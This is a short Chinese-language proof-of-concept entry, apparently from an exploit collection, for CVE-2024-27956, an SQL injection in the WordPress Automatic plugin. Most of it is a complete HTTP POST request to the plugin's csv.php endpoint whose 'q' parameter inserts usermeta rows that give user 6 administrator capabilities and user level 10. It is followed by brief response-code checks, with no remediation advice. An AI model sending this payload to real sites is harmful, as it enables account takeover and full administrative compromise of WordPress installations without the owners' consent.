﻿# WordPress Automatic SQL注入漏洞2

> 更新时间：2024-05-06

> 漏洞编号：CVE-2024-27956

> 漏洞说明：由于变量“q”直接传递到$wpdb->get_results（）调用中，因此可以直接执行SQL命令。导致后果：可添加后台账号

> 漏洞特征：

> 验证脚本：HTTP

```
POST /wp-content/plugins/wp-automatic/inc/csv.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

q=INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (6, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'), (6, 'wp_user_level', '10');&auth=%20&integ=6ed26ea278413ec91e2c27fed01eac6c
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：WordPress Automatic SQL注入漏洞2.poc

